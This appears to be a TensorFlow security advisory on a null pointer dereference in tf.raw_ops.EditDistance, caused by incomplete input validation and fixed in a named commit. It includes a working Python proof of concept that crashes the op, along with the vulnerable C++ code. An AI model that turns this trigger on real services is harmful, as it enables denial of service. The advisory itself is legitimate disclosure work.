An attacker can trigger a null pointer dereference in the implementation of `tf.raw_ops.EditDistance`. This is because the implementation(https://github.com/tensorflow/tensorflow/blob/79865b542f9ffdc9caeb255631f7c56f1d4b6517/tensorflow/core/kernels/edit_distance_op.cc#L103-L159) has incomplete validation of the input parameters. The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\nFrom Github:\n### Impact\nAn attacker can trigger a null pointer dereference in the implementation of `tf.raw_ops.EditDistance`: \n    \n```python\nimport tensorflow as tf\n\nhypothesis_indices = tf.constant([247, 247, 247], shape=[1, 3], dtype=tf.int64)\nhypothesis_values = tf.constant([-9.9999], shape=[1], dtype=tf.float32)\nhypothesis_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)\ntruth_indices = tf.constant([], shape=[0, 3], dtype=tf.int64)\ntruth_values = tf.constant([], shape=[0], dtype=tf.float32)\ntruth_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)\n\ntf.raw_ops.EditDistance(\n    hypothesis_indices=hypothesis_indices, hypothesis_values=hypothesis_values,\n    hypothesis_shape=hypothesis_shape, truth_indices=truth_indices,\n    truth_values=truth_values, truth_shape=truth_shape, normalize=True)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/79865b542f9ffdc9caeb255631f7c56f1d4b6517/tensorflow/core/kernels/edit_distance_op.cc#L103-L159) has incomplete validation of the input parameters.\n\nIn the above scenario, an attacker causes an allocation of an empty tensor for the output:\n\n```cc\nOP_REQUIRES_OK(ctx, ctx->allocate_output(\"output\", output_shape, &output));\nauto output_t = output->flat<float>();\noutput_t.setZero();\n```\n\nBecause `output_shape` has 0 elements, the result of `output->flat<T>()` has an empty buffer, so calling `setZero` would result in a null dereference.\n\n### Patches\nWe have patched the issue in GitHub commit [f4c364a5d6880557f6f5b6eb5cee2c407f0186b3](https://github.com/tensorflow/tensorflow/commit/f4c364a5d6880557f6f5b6eb5cee2c407f0186b3).\n\nThe fix will be included in TensorFlow 2.5.0.
